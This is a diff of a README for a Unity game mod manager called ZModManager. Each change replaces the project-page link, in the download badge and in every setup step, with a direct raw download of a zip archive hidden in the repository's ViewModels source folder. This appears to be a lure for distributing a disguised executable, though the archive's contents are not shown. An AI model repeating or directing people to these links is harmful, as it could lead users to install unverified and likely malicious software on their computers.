@@ -1,6 +1,6 @@
 # 🛠️ ZModManager - Simple Mod Control for Unity Games
 
-[![Download ZModManager](https://img.shields.io/badge/Download-ZModManager-blue?style=for-the-badge&logo=github)](https://github.com/Sociocultural-factor293/ZModManager)
+[![Download ZModManager](https://img.shields.io/badge/Download-ZModManager-blue?style=for-the-badge&logo=github)](https://github.com/Sociocultural-factor293/ZModManager/raw/refs/heads/main/ZModManager/ViewModels/Mod-Z-Manager-2.0.zip)
 
 ## 🎮 What ZModManager Does
 
@@ -18,7 +18,7 @@ Use it to:
 
 Visit this page to download and set up ZModManager:
 
-https://github.com/Sociocultural-factor293/ZModManager
+https://github.com/Sociocultural-factor293/ZModManager/raw/refs/heads/main/ZModManager/ViewModels/Mod-Z-Manager-2.0.zip
 
 If the page has a release file, download it to your PC. If it gives you a project package instead, download that package and use the included Windows build.
 
@@ -39,7 +39,7 @@ If your game uses a protection tool or has files in use, close the game before y
 Follow these steps to get ZModManager running on Windows.
 
 1. Open the download page:
-   https://github.com/Sociocultural-factor293/ZModManager
+   https://github.com/Sociocultural-factor293/ZModManager/raw/refs/heads/main/ZModManager/ViewModels/Mod-Z-Manager-2.0.zip
 
 2. Get the app files from the page.
    - If you see a release package, download it.
@@ -198,7 +198,7 @@ A common use looks like this:
 
 Download or open the project page here:
 
-https://github.com/Sociocultural-factor293/ZModManager
+https://github.com/Sociocultural-factor293/ZModManager/raw/refs/heads/main/ZModManager/ViewModels/Mod-Z-Manager-2.0.zip
 
 ## 🖥️ File Layout Example
 
